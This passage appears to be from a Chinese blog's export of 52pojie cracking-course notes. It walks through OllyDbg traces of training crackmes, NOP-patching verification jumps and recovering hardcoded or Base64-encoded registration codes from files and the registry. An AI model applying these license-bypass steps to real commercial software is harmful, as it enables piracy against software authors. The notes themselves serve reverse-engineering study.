04000080   push 0x80000004\n0040267B  |.  6A 00         push 0x0\n0040267D  |.  68 936C4800   push 课件1_网.00486C93                      ;  账号密码不正确\n00402682  |.  68 04000000   push 0x4\n```\n\n猜测登录时，程序先比对输入的用户名和某网页的所有用户名，如果存在再比对这个用户名的密码。两个都比对成功则执行登录成功的代码。\n\n输入假用户名和假密码进入循环。\n\n```asm\n00402485  |.  50            |push eax\n00402486  |.  3BC8          |cmp ecx,eax\n00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空\n0040248E  |.  8B5D D0       |mov ebx,[local.12]\n00402491  |.  E8 ADEBFFFF   |call 课件1_网.00401043\n```\n\n```asm\n0040250B  |.  83C4 04       |add esp,0x4\n0040250E  |>  837D B8 00    |cmp [local.18],0x0\n00402512  |.  0F84 35010000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转\n00402518  |.  8B5D CC       |mov ebx,[local.13]\n0040251B  |.  E8 23EBFFFF   |call 课件1_网.00401043\n```\n\n```asm\n00402595  |.  83C4 04       |add esp,0x4\n00402598  |>  837D B8 00    |cmp [local.18],0x0\n0040259C  |.  0F84 AB000000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转\n004025A2  |.  8B5D C8       |mov ebx,[local.14]\n004025A5  |.  E8 99EAFFFF   |call 课件1_网.00401043\n```\n\n将这两个`je`指令都nop掉，实现破解。\n\n但这节课的重点不是破解，而是算法流程。\n\n载入OD，Ctrl+B输入二进制字串`FF 55 FC 5F 5E`，这是易语言的按钮事件死码。\n\n```asm\n0041E18D  |> \\FF55 FC       call [local.1]\n0041E190  |.  5F            pop edi                                  ;  kernel32.7C817077\n0041E191  |.  5E            pop esi                                  ;  kernel32.7C817077\n```\n\nF9运行至此处，再F9出现主程序，输入用户名和密码后点击注册，程序再次停在此处，现在F7进入call指令，就是作者编写的易语言代码处了。F8步过跟踪，到这里就是将要访问的网页压栈。\n\n```asm\n00401BD1  |.  68 FA6B4800   push 课件1_网.00486BFA                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vy1h.html\n```\n\n{% asset_img 访问网页.png 访问网页 %}\n\n看着貌似写了一堆奇奇怪怪的东西，先不管它。回到OD继续往下，会发现信息窗口有类似于html的字符串，在信息窗口选中右键->数据窗口中跟随数值，发现这个程序的操作是把读取网页源码。\n\n```asm\n00177CF0  00 00 00 00 DF 00 00 00 3C 68 74 6D 6C 3E 0D 0A  ....?..<html>..\n00177D00  3C 68 65 61 64 3E 0D 0A 3C 73 63 72 69 70 74 20  <head>..<script\n00177D10  6C 61 6E 67 75 61 67 65 3D 22 6A 61 76 61 73 63  language=\"javasc\n00177D20  72 69 70 74 22 3E 73 65 74 54 69 6D 65 6F 75 74  ript\">setTimeout\n00177D30  28 22 6C 6F 63 61 74 69 6F 6E 2E 72 65 70 6C 61  (\"location.repla\n00177D40  63 65 28 6C 6F 63 61 74 69 6F 6E 2E 68 72 65 66  ce(location.href\n00177D50  2E 73 70 6C 69 74 28 5C 22 23 5C 22 29 5B 30 5D  .split(\\\"#\\\")[0]\n00177D60  29 22 2C 31 30 30 30 29 3B 3C 2F 73 63 72 69 70  )\",1000);</scrip\n00177D70  74 3E 0D 0A 3C 2F 68 65 61 64 3E 0D 0A 3C 69 66  t>..</head>..<if\n00177D80  72 61 6D 65 20 73 72 63 3D 22 68 74 74 70 3A 2F  rame src=\"http:/\n00177D90  2F 32 32 32 2E 32 30 31 2E 35 34 2E 36 34 3A 38  /222.201.54.64:8\n00177DA0  39 2F 66 6C 61 73 68 72 65 64 69 72 2E 68 74 6D  9/flashredir.htm\n00177DB0  6C 22 20 66 72 61 6D 65 62 6F 72 64 65 72 3D 30  l\" frameborder=0\n00177DC0  3E 3C 2F 69 66 72 61 6D 65 3E 0D 0A 3C 2F 68 74  ></iframe>..</ht\n00177DD0  6D 6C 3E 0D 0A 0D 0A 68 1D 00 1E 00 31 01 08 00  ml>....h\u001d.\u001e.1\u0001\b.\n00177DE0  3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A  <html>..<head>..\n00177DF0  3C 73 63 72 69 70 74 20 6C 61 6E 67 75 61 67 65  <script language\n00177E00  3D 22 6A 61 76 61 73 63 72 69 70 74 22 3E 73 65  =\"javascript\">se\n00177E10  74 54 69 6D 65 6F 75 74 28 22 6C 6F 63 61 74 69  tTimeout(\"locati\n00177E20  6F 6E 2E 72 65 70 6C 61 63 65 28 6C 6F 63 61 74  on.replace(locat\n00177E30  69 6F 6E 2E 68 72 65 66 2E 73 70 6C 69 74 28 5C  ion.href.split(\\\n00177E40  22 23 5C 22 29 5B 30 5D 29 22 2C 31 30 30 30 29  \"#\\\")[0])\",1000)\n00177E50  3B 3C 2F 73 63 72 69 70 74 3E 0D 0A 3C 2F 68 65  ;</script>..</he\n00177E60  61 64 3E 0D 0A 3C 69 66 72 61 6D 65 20 73 72 63  ad>..<iframe src\n00177E70  3D 22 68 74 74 70 3A 2F 2F 32 32 32 2E 32 30 31  =\"http://222.201\n00177E80  2E 35 34 2E 36 34 3A 38 39 2F 66 6C 61 73 68 72  .54.64:89/flashr\n00177E90  65 64 69 72 2E 68 74 6D 6C 22 20 66 72 61 6D 65  edir.html\" frame\n00177EA0  62 6F 72 64 65 72 3D 30 3E 3C 2F 69 66 72 61 6D  border=0></ifram\n00177EB0  65 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 0D 0A 00  e>..</html>.....\n```\n\n再往下滑看到正文的一些字符串，应该是提取这些字符串之间的字符串，存进内存里。\n\n```asm\n00401E97  |.  68 536C4800   push 课件1_网.00486C53                      ;  <p>^^^\n...\n(进入第一个大循环)\n00401F82  |.  68 5A6C4800   |push 课件1_网.00486C5A                     ;  $$$\n...\n00402003  |.  68 5E6C4800   |push 课件1_网.00486C5E                     ;  ###\n...\n00402084  |.  68 626C4800   |push 课件1_网.00486C62                     ;  ***\n```\n\n```asm\n(进入第二个大循环)\n00402485  |.  50            |push eax\n00402486  |.  3BC8          |cmp ecx,eax\n00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空\n...\n004024D9  |.  83C4 10       |add esp,0x10                            ;  输入的用户名\n004024DC  |.  8945 BC       |mov [local.17],eax                      ;  存进local.17\n```\n\n此时发现寄存器窗口的eax也是我们输入的用户名，右键->数据窗口中跟随。\n\n```asm\n00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0A 00  abc.\u0001...\u0002.\u0002.<\u0001..\n00169980  61 62 63 39 39 00 37 00 02 00 02 00 22 01 0B 00  abc99.7.\u0002.\u0002.\"\u0001\u000b.\n00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1.\u0001\u0015.$.\u0002. \u0001..\n```\n\n发现上面是\\^\\^\\^和\\$\\$\\$之间的内容“abc”，下面也是\\^\\^\\^和$$$之间的内容“abc1”。\n\n```asm\n00402512     /0F84 35010000 je 课件1_网.0040264D                        ;  不能跳转\n```\n\n绕过这个跳转继续往下，到达这里后eax的值为111，是$$$和###之间的内容“111”，并且对应网页，前面的字符串是“abc”。数据窗口这一行的上面也是“abc”。\n\n```asm\n0040255E  |.  E8 5F100000   |call 课件1_网.004035C2\n00402563  |.  83C4 10       |add esp,0x10\n```\n\n```asm\n00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0C 00  abc.\u0001...\u0002.\u0002.<\u0001..\n00169980  31 31 31 00 39 00 37 00 02 00 02 00 22 01 0B 00  111.9.7.\u0002.\u0002.\"\u0001\u000b.\n00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1.\u0001\u0015.$.\u0002. \u0001..\n```\n\n继续往下\n\n```asm\n0040259C     /0F84 AB000000 je 课件1_网.0040264D                        ;  不能跳转\n```\n\n绕过跳转\n\n```asm\n00402630  |.  E8 870F0000   |call 课件1_网.004035BC\n```\n\n运行到这里时弹窗说登录成功，到期时间无法显示。但可以猜测` ^^^abc$$$111###30*** `这一串中的“30”应该是到期时间。所以这一串奇怪的字符其实包含了用户名、密码和到期时间。\n\n{% asset_img 登录成功.png 登录成功 %}\n\n## 2.2 网页加密\n\n破解同样是修改两个跳转指令。\n\n算法分析：与2.1同样操作来到\n\n```asm\n004019C0  |.  68 CD9D4800   push 课件2_网.00489DCD                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vzdy.html\n```\n\n{% asset_img 网页加密.png 网页加密 %}\n\n这时直接在程序按照分隔符输入字符串是不对的。看到字符串有等号很明显是Base64加密。拿去解码即可得真正的用户名、密码和到期时间。\n\n{% asset_img base64解码.png base64解码 %}\n\n但我们这个是分析流程，所以还是继续往下看看吧\n\n```asm\n00401F22  |.  83C4 1C       |add esp,0x1C                            ;  加密后的用户名(第一次循环用户名为空，第二次才显示第一行的用户名)\n00401F25  |.  8945 AC       |mov [local.21],eax\n00401F28  |.  8D45 AC       |lea eax,[local.21]\n00401F2B  |.  50            |push eax\n00401F2C  |.  68 08FA4A00   |push 课件2_网.004AFA08\n00401F31  |.  8B0424        |mov eax,dword ptr ss:[esp]\n00401F34  |.  8B00          |mov eax,dword ptr ds:[eax]\n00401F36  |.  8B00          |mov eax,dword ptr ds:[eax]\n00401F38  |.  FF50 0C       |call dword ptr ds:[eax+0xC]             ;  base64解密出来的用户名\n00401F3B  |.  8945 A8       |mov [local.22],eax\n```\n\n执行完base64解密的函数后，eax右键->数据窗口中跟随，就可看到解密出来的“abc”。\n\n```asm\n001702A8  01 00 00 00 03 00 00 00 61 62 63 00 75 01 08 00  \u0001...\u0003...abc.u\u0001\b.\n```\n\n密码和到期时间一样的操作。\n\n## 2.3 EXE验证\n\n爆破：\n\n开启服务端，再将客户端载入OD，查找敏感字符串或设置按钮事件，找到函数段首下断运行，点击“验证”，程序停在断点处。\n\n```asm\n004012EB  |. /0F85 99000000 jnz 课件3_易.0040138A                       ;  不能跳\n004012F1  |. |8B5D F8       mov ebx,[local.2]\n004012F4  |. |E8 0BFDFFFF   call 课件3_易.00401004\n004012F9  |. |B8 01000000   mov eax,0x1\n004012FE  |. |3BC1          cmp eax,ecx                              ;  课件3_易.00482C3B\n00401300  |. |7C 0D         jl short 课件3_易.0040130F\n00401302  |. |68 01000000   push 0x1\n00401307  |. |E8 4E030000   call 课件3_易.0040165A\n0040130C  |. |83C4 04       add esp,0x4\n0040130F  |> |C1E0 02       shl eax,0x2\n00401312  |. |03D8          add ebx,eax\n00401314  |. |895D F4       mov [local.3],ebx\n00401317  |. |8B5D F4       mov ebx,[local.3]\n0040131A  |. |FF33          push dword ptr ds:[ebx]\n0040131C  |. |68 442C4800   push 课件3_易.00482C44                      ;  到期时间：\n00401321  |. |B9 02000000   mov ecx,0x2\n00401326  |. |E8 01FEFFFF   call 课件3_易.0040112C\n```\n\n分析算法：与2.4一样，只是没了加密过程。\n\n## 2.4 EXE加密验证\n\n爆破与2.3一样。\n\n分析算法：\n\n开头同2.1，F8一步步跟踪。\n\n```asm\n00401E6E  |.  E8 ED250000   call 课件4_易.00404460                      ;  获取输入的用户名\n```\n\n```asm\n00401EC2  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  base64加密用户名：YWJj\n```\n\n```asm\n00401EE6  |.  E8 75250000   call 课件4_易.00404460                      ;  获取输入的密码\n```\n\n```asm\n00401F3A  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  密码base64加密:MTIz\n```\n\n```asm\n00401F68  |.  8945 E0       mov [local.8],eax                        ;  拼接：YWJj|MTIz\n```\n\n经过`retn`后F9运行，程序又回到断点处。这次F7进去代码与之前不同。\n\n```asm\n00401B42  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误\n```\n\n```asm\n00401B6B  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误\n```\n\n```asm\n00401C47  |.  68 CD6E4800   push 课件4_易.00486ECD                      ;  【登录成功】\n```\n\n```asm\n00401C59  |.  83F8 00       cmp eax,0x0                              ;  登录成功和登录失败相比较\n00401C5C      0F85 99000000 jnz 课件4_易.00401CFB                       ;  nop掉\n```\n\n## 2.5 EXE加密验证2.0\n\n```asm\n004013C4     /0F85 CC020000 jnz 课件5_易.00401696\n```\n\n```asm\n0040147F  |. /0F8C D0010000 jl 课件5_易.00401655\n```\n\n```asm\n004014CE  |. /0F8E 99000000 jle 课件5_易.0040156D\n```\n\n把这三处都nop掉即可。\n\n## 2.6 可可 v9.5\n\n程序无壳，放心食用。调试选项全选，StrongOD勾选忽略某些异常。下易语言按钮事件断点`FF 55 FC 5F 5E`。运行，输入账号密码，点击登录。取消断点，F7跟进，一路F8，注意堆栈窗口。\n\n```asm\n00405776   .  E8 D9460000   call 第七课作.00409E54                       ;  获取输入的用户名\n```\n\n```asm\n004057C8   .  E8 87460000   call 第七课作.00409E54                       ;  获取输入的密码\n```\n\n```asm\n00405992   . /0F84 7F000000 je 第七课作.00405A17                         ;  要跳\n00405998   . |8D45 F8       lea eax,dword ptr ss:[ebp-0x8]\n0040599B   . |50            push eax\n0040599C   . |E8 A4BEFFFF   call 第七课作.00401845                       ;  账号未找到\n```\n\n```asm\n00405AB9   . /0F84 FE000000 je 第七课作.00405BBD                         ;  要跳\n...\n00405B63   .  68 04000080   push 0x80000004\n00405B68   .  6A 00         push 0x0\n00405B6A   .  68 14C65500   push 第七课作.0055C614                       ;  err\n00405B6F   .  68 04000080   push 0x80000004\n00405B74   .  6A 00         push 0x0\n00405B76   .  68 18C65500   push 第七课作.0055C618                       ;  signdata\n00405B7B   .  68 04000080   push 0x80000004\n```\n\n改变两个跳转后，F8到这，卡住，暂停+运行，程序弹出不断弹出“用户身份未校验”，还弹出了一个“暗桩”。\n\n```asm\n00405F78   .  E8 D13E0000   call 第七课作.00409E4E\n```\n\n救命啊我不会！！！\n\n----------------------------------\n\n跟进继续F8，到这又回到按钮事件。重载，跟进这个函数。\n\n```asm\n004087E7  |.  E8 8B030000   call 第七课作.00408B77\n```\n\n发现跟进这个函数里面的`408C3F`的call指令又回到按钮事件。\n\n```\n00408C3F  |.  E8 D2D6FFFF   call 第七课作.00406316   \n```\n\n跟进这个函数里面的`4063FF`的call指令又回到按钮事件。\n\n```asm\n004063FF  |.  E8 0DB3FFFF   call 第七课作.00401711\n```\n\n\n\n```\n004087CC  |.  6A FF         push -0x1\n004087CE  |.  6A 08         push 0x8\n004087D0  |.  68 7A6B0116   push 0x16016B7A\n004087D5  |.  68 2B010152   push 0x5201012B\n004087DA  |.  E8 63160000   call 第七课作.00409E42\n004087DF  |.  83C4 18       add esp,0x18\n004087E2  |.  68 00000000   push 0x0\n004087E7  |.  E8 8B030000   call 第七课作.00408B77                       ;  暗桩call，跟进\n004087EC  |.  68 01000000   push 0x1\n004087F1  |.  E8 81030000   call 第七课作.00408B77\n```\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第五六课——解除程序重启验证，程序打补丁","url":"/posts/bb44dc0.html","content":"\n# 1. 课前预习\n\n- 熟悉OD字符串插件的使用\n  右键或插件->中文搜索引擎->智能搜索，Ctrl+F搜索字符串。\n\n- 熟悉OD如何下断点\n  Ctrl+G，直接搜索API下断\n  Ctrl+N，输入表搜索API->右键->在每个参考上设置断点\n  利用插件，ApiBreak和API断点设置工具都可以\n\n<!--more-->\n\n- 熟悉procmon的使用\n  可以监控文件，注册表，网络，进线程信息\n  排除进程:Exclude\n  查看指定进程:Include\n\n- 熟悉文件操作API的使用\n  CreateFileA(W):创建文件\n  ReadFile:读取文件\n  WriteFile:写入文件\n  CloseHandle:关闭句柄\n  读取文件:CreateFile->ReadFile->CloseHandle\n  写入文件:CreateFile->WriteFile->CloseHandle\n\n- 熟悉注册表操作API的使用\n  创建注册表Key:RegCreateKey\n  打开注册表Key:RegOpenKey\n  查询注册表键值:RegQueryValueExA\n  写入注册表键值:RegSetValueEx\n\n# 2. 重启验证\n\n什么是重启验证\n\n- 重启验证顾名思义就是在程序启动时验证注册信息。 \n\n执行流程\n\n- 基本的执行流程：注册信息输入-->程序重启-->执行验证机制-->正常执行\n\n- 扩展的执行流程：注册信息输入-->执行部分验证机制/执行假验证机制-->程序重启-->执行真验证机制-->正常执行\n- 对于有经验的作者来说，可以在注册信息输入和程序重启之间加入假的验证机制，假的验证机制一般比较简单，比如说只是当单纯的明码比较，当我们输入假的注册码，程序一般会提示注册成功，此时程序就会知道我们是逆向者，在程序重启时就会假装注册成功，在执行程序功能时就会报错或是无反应，这就是所谓的暗桩。\n\n重启验证的类型\n\n- 重启验证根据写入信息位置的不同一般分两类，一类是将注册信息写入文件中，一类是将注册信息写入注册表中。\n\n定位关键代码\n\n1. 字符串定位\n   通过OD字符串插件扫描敏感字符串，一般出现的文件路径或是注册表路径都可能是验证信息的保存位置\n2. 监控工具定位\n   通过procmon等监控工具监控注册信息的写入位置\n3. API定位\n   通过定位CreateFile，RegCreateKey，GetPrivateProfileStringA等API来获取注册信息的写入位置\n\n# 3. 重启验证示例\n\n运行一下程序查看它的操作机制。\n\n{% asset_img 示例.png 示例 %}\n\n输入任意字符串，点击重启验证1，出现弹窗，在程序的本目录下生成一个.txt文件，程序退出。里面是我们输入的字符串。\n\n```\n888888888\n```\n\n再次，点击重启验证2，出现弹窗，在程序的本目录下生成一个.ini文件，程序退出。里面是我们输入的字符串。\n\n```\n[验证]\nKey=888888888\n```\n\n再次，点击重启验证3，出现弹窗，在本机注册表里写入信息，程序退出。徽标键+R打开运行窗口，输入`regedit`打开注册表，在下图看到输入的字符串。\n\n{% asset_img 注册表.png 注册表 %}\n\n将所有生成的文件和注册表信息删除，载入OD，搜索敏感字符串。\n\n{% asset_img 搜索字符串.png 搜索字符串 %}\n\n首先看重启验证1，双击进入反汇编代码，找到函数开头下断。运行，输入假码，选择重启验证1，OD停在断点处。F8往下走走，遇到call先用enter探探路再考虑是否跟进去。这个call里面有很多API函数，程序经过这条指令后，eax变成我们输入的字符串，所以这个函数是取出输入框里的字符串。\n\n```asm\n0040275B  |.  E8 C8590100   call 52PoJie?00418128;eax=888888888\n00402760  |.  8B45 EC             mov eax,[local.5]\n00402763  |.  8378 F4 00          cmp dword ptr ds:[eax-0xC],0x0;判断字符串是否为空\n00402767  |.  74 74               je short 52PoJie?004027DD\n```\n\n继续F8，到`CreateFileA`函数，创建一个52Pojie.txt文件。\n\n```asm\n00402769  |.  6A 00               push 0x0                                     ; /hTemplateFile = NULL\n0040276B  |.  6A 00               push 0x0                                     ; |Attributes = 0\n0040276D  |.  6A 02               push 0x2                                     ; |Mode = CREATE_ALWAYS\n0040276F  |.  6A 00               push 0x0                                     ; |pSecurity = NULL\n00402771  |.  6A 01               push 0x1                                     ; |ShareMode = FILE_SHARE_READ\n00402773  |.  68 00000040         push 0x40000000                              ; |Access = GENERIC_WRITE\n00402778  |.  FFB6 BC000000       push dword ptr ds:[esi+0xBC]                 ; |FileName = \"C:\\Documents and Settings\\Administrator\\桌面\\吾爱破解培训第五课例子\\52Pojie.txt\"\n0040277E  |.  FF15 10345400       call dword ptr ds:[<&KERNEL32.CreateFileA>]  ; \\CreateFileA\n```\n\nF8到`WriteFileA`函数，将我们输入的字符串写入52Pojie.txt文件中。\n\n```asm\n004027AD  |> \\6A 00               push 0x0                                     ; /pOverlapped = NULL\n004027AF  |.  8D45 E8             lea eax,[local.6]                            ; |\n004027B2  |.  50                  push eax                                     ; |pBytesWritten = 00000009\n004027B3  |.  57                  push edi                                     ; |nBytesToWrite = 0x9\n004027B4  |.  51                  push ecx                                     ; |Buffer = 00161100\n004027B5  |.  56                  push esi                                     ; |hFile = 000000D4 (window)\n004027B6  |.  FF15 2C345400       call dword ptr ds:[<&KERNEL32.WriteFile>]    ; \\WriteFile\n```\n\n继续F8，`004027C9`执行弹窗，退出，关闭句柄。再之后就退出程序了。\n\n```asm\n004027C0  |.  6A 00               push 0x0\n004027C2  |.  6A 00               push 0x0\n004027C4  |.  68 60465400         push 52PoJie?00544660                        ;  你选择的验证类型是重启验证1\n004027C9  |.  E8 B17F0000         call 52PoJie?0040A77F\n004027CE  |.  6A 00               push 0x0                                     ; /ExitCode = 0x0\n004027D0  |.  FF15 40385400       call dword ptr ds:[<&USER32.PostQuitMessage>>; \\PostQuitMessage\n004027D6  |>  56                  push esi                                     ; /hObject = 000000D4 (window)\n004027D7  |.  FF15 24345400       call dword ptr ds:[<&KERNEL32.CloseHandle>]  ; \\CloseHandle\n```\n\n因为它是重启验证，所以在这个函数中找不到验证算法。而是在主程序出来前就已经运行验证算法了。再次打开程序时，程序会在相应的.txt，.ini或注册表里找注册码进行验证。\n\n重载，找敏感字符串有关“52Pojie.txt”的双击进去反汇编代码，在函数开头下断。F9运行至断点处，F8路过这个函数\n\n```asm\n00402AE2  |.  50            push eax                                 ; /Buffer = 00174B68\n00402AE3  |.  68 04010000   push 0x104                               ; |BufSize = 104 (260.)\n00402AE8  |.  FF15 14345400 call dword ptr ds:[<&KERNEL32.GetCurrent>; \\GetCurrentDirectoryA 获取当前目录\n```\n\n继续F8，发现这个跳转跳过了“验证通过”。\n\n```asm\n00402BC0  |.  E8 1BF4FFFF   call 52PoJie?00401FE0\n00402BC5  |.  85C0          test eax,eax\n00402BC7  |. /74 15         je short 52PoJie?00402BDE\n00402BC9  |. |8B8D DCFEFFFF mov ecx,[local.73]\n00402BCF  |. |68 18465400   push 52PoJie?00544618                    ;  验证通过\n00402BD4  |. |E8 E7980100   call 52PoJie?0041C4C0\n00402BD9  |. |BB 01000000   mov ebx,0x1\n00402BDE  |> \\8B85 E0FEFFFF mov eax,[local.72]\n```\n\n如果是爆破的话，直接将跳转指令nop掉。保存，运行一下，成功。\n\n{% asset_img nop.png 验证1通过 %}\n\n如果想逆向分析，跟进去第1行的call指令，那个就是算法函数。\n\n```asm\n00401FF7  |.  56            push esi                                 ; /hTemplateFile = 00174B68\n00401FF8  |.  56            push esi                                 ; |Attributes = ARCHIVE|TEMPORARY|COMPRESSED|174248\n00401FF9  |.  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING\n00401FFB  |.  56            push esi                                 ; |pSecurity = 00174B68\n00401FFC  |.  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ\n00401FFE  |.  6A 01         push 0x1                                 ; |Access = 1\n00402000  |.  FFB1 BC000000 push dword ptr ds:[ecx+0xBC]             ; |FileName = \"C:\\Documents and Settings\\Administrator\\桌面\\吾爱破解培训第五课例子\\52Pojie.txt\"\n00402006  |.  FF15 10345400 call dword ptr ds:[<&KERNEL32.CreateFile>; \\CreateFileA 创建或打开文件，这里是打开文件\n```\n\nReadFile函数，当程序运行到`00402046`时，Buffer指针指向文件内容首地址`0012F348`。\n\n```asm\n00402039  |.  56            push esi                                 ; /pOverlapped = NULL\n0040203A  |.  50            push eax                                 ; |pBytesRead = 0012F348\n0040203B  |.  68 04010000   push 0x104                               ; |BytesToRead = 104 (260.)\n00402040  |.  8D85 F4FEFFFF lea eax,[local.67]                       ; |\n00402046  |.  50            push eax                                 ; |Buffer = 0012F348\n00402047  |.  57            push edi                                 ; |hFile = 000000AC (window)\n00402048  |.  FF15 28345400 call dword ptr ds:[<&KERNEL32.ReadFile>] ; \\ReadFile 读文件内容\n```\n\n在信息窗口选中右键->数据窗口跟随，发现全是空数据，执行完这个函数时，`0012F348`出现我们输入的字符串。\n\n```asm\n00402048  |.  FF15 28345400 call dword ptr ds:[<&KERNEL32.ReadFile>] ; \\ReadFile\n0040204E  |.  85C0          test eax,eax;返回值为1，表明文件不为空\n00402050  |.  74 3D         je short 52PoJie?0040208F\n00402052  |.  B9 24465400   mov ecx,52PoJie?00544624                 ;  JXU2MjExJXU2\n00402057  |.  8D85 F4FEFFFF lea eax,[local.67]\n0040205D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]\n00402060  |>  8A10          /mov dl,byte ptr ds:[eax];这个循环执行的是strcmp函数，比较eax和ecx是否相等。执行到这一句时，eax是我们输入的字符串，ecx是上面的注释JXU2MjExJXU2\n00402062  |.  3A11          |cmp dl,byte ptr ds:[ecx]\n00402064  |.  75 1A         |jnz short 52PoJie?00402080\n00402066  |.  84D2          |test dl,dl\n00402068  |.  74 12         |je short 52PoJie?0040207C\n0040206A  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040206D  |.  3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00402070  |.  75 0E         |jnz short 52PoJie?00402080\n00402072  |.  83C0 02       |add eax,0x2\n00402075  |.  83C1 02       |add ecx,0x2\n00402078  |.  84D2          |test dl,dl\n0040207A  |.^ 75 E4         \\jnz short 52PoJie?00402060\n0040207C  |>  33C0          xor eax,eax\n```\n\n所以很容易就知道重启验证1的注册码是`JXU2MjExJXU2`。将生成的.txt文件内容改为这个，再打开原程序发现验证通过。\n\n验证2、3一样操作，但需要注意，一定要先生成一个配置文件或写入注册表再进行重启验证调试。验证1生成的.txt文件不影响验证2和验证3的调试，可以不删除。\n\n验证2：\n\n```asm\n00402C34  |.  E8 77F4FFFF   call 52PoJie?004020B0\n00402C39  |.  85C0          test eax,eax\n00402C3B  |.  74 11         je short 52PoJie?00402C4E\n00402C3D  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过\n```\n\n```asm\n0040210C  |.  B9 40465400   mov ecx,52PoJie?00544640                 ;  NjJGJXU3NTI\n```\n\n验证3：\n\n```asm\n00402CB2  |.  E8 B9F4FFFF   call 52PoJie?00402170\n00402CB7  |.  85C0          test eax,eax\n00402CB9  |.  74 37         je short 52PoJie?00402CF2\n00402CBB  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过\n```\n\n```asm\n004021FE  |.  B9 54465400   mov ecx,52PoJie?00544654                 ;  4JXU2MjM3\n```\n\n细心一点就会在字符串列表发现这三个注册码\n\n{% asset_img 注册码.png 注册码 %}\n\n最后，重启验证的普通思路\n\n1. 如果是写进.txt文件，一般都是这个步骤：\n\n   CreateFileA->WriteFile->ReadFile->比较算法\n\n2. 如果是写进.ini文件，一般都是这个步骤：\n\n   WritePrivateProfileStringA(写入配置信息)->GetPrivateProfileStringA(读取配置信息)\n\n3. 如果是写进注册表，一般都是这个步骤：\n\n   创建注册表Key:RegCreateKey->打开注册表Key:RegOpenKey->写入注册表键值:RegSetValueEx->查询注册表键值:RegQueryValue(Ex)\n\n三个都通过后，会出现一个彩蛋，输入字符串后，弹出消息框。\n\n{% asset_img 彩蛋.png 彩蛋 %}\n\n输入不同字符串弹窗显示不同的内容。彩蛋很简单，其实就是把三个验证码拼接，Base64解码，UTF-8转换，得到“我是用户”。\n\n```asm\nJXU2MjExJXU2NjJGJXU3NTI4JXU2MjM3\n\nBase64解码：\n%u6211%u662F%u7528%u6237\n\nUnicode转换：\n我是用户\n```\n\n{% asset_img 编码转换.png 编码转换 %}\n\n把三个验证码拼接，弹窗。\n\n{% asset_img 彩蛋3.png 彩蛋 %}\n\n# 4. 重启验证作业\n\n输入假码没什么反应。\n\n{% asset_img 课后作业.png 课后作业 %}\n\n拉去OD看看，搜索字符串，发现只有一个验证码`ITN3UXJGJ`显示。\n\n{% asset_img 搜索字符串2.png 搜索字符串 %}\n\n双击进去发现有`CreateFile`和`ReadFile`，所以判定这个是写入`.txt`文件的注册码。\n\n{% asset_img txt文件.png txt文件 %}\n\n用`GetPrivateProfileStringA`函数找到`.ini`文件的比较注册码算法。Ctrl+N，搜索`GetPrivateProfileStringA`右键->在每个参考上设置断点。或者在反汇编窗口右键->查找->所有模块间的调用，搜索函数，右键->在每个调用到`GetPrivateProfileStringA`上设置断点。一个一个断点点进去看，找到一个最像比较算法的(有循环、比较、跳转指令)。\n\n```asm\n0040218F  |.  66:C785 F0FEF>mov word ptr ss:[ebp-0x110],0x1A28       ; |\n00402198  |.  FF15 1C345400 call dword ptr ds:[<&KERNEL32.GetPrivate>; \\GetPrivateProfileStringA\n0040219E  |.  5E            pop esi                                  ;  kernel32.7C817077\n0040219F  |.  85C0          test eax,eax\n004021A1  |.  74 4D         je short 吾爱破解.004021F0\n004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]\n004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004021B0  |>  8A01          /mov al,byte ptr ds:[ecx]    \n004021B2  |.  41            |inc ecx                       \n004021B3  |.  84C0          |test al,al\n004021B5  |.^ 75 F9         \\jnz short 吾爱破解.004021B0\n004021B7  |.  2BCA          sub ecx,edx                              ;  ntdll.KiFastSystemCallRet\n004021B9  |.  83F9 0E       cmp ecx,0xE                   \n004021BC  |.  75 32         jnz short 吾爱破解.004021F0\n004021BE  |.  33C0          xor eax,eax                   \n004021C0  |>  0FB69405 E4FE>/movzx edx,byte ptr ss:[ebp+eax-0x11C]\n004021C8  |.  0FBE8C05 F4FE>|movsx ecx,byte ptr ss:[ebp+eax-0x10C]\n004021D0  |.  83C2 30       |add edx,0x30                 \n004021D3  |.  3BD1          |cmp edx,ecx                   \n004021D5  |.  75 19         |jnz short 吾爱破解.004021F0\n004021D7  |.  40            |inc eax\n004021D8  |.  83F8 0E       |cmp eax,0xE\n004021DB  |.^ 72 E3         \\jb short 吾爱破解.004021C0\n```\n\n由于这个断点程序没有被经过，很难分析它的算法(我目前能力有限)。要想经过这段算法，就要看一下我们输入字符串后，程序怎么运行的。反汇编窗口右键->查找->所有模块间的调用，搜索`GetWindowTextA`，在每个调用到`GetWindowTextA`上设置断点。输入字符串后运行，程序停在某断点处。养成好习惯，把其它的`GetWindowTextA`断点取消。\n\n```asm\n0041837E  |.  FF15 2C365400 call dword ptr ds:[<&USER32.GetWindowTex>; \\GetWindowTextA\n00418384  |.  8B4D 08       mov ecx,[arg.1]\n00418387  |.  6A FF       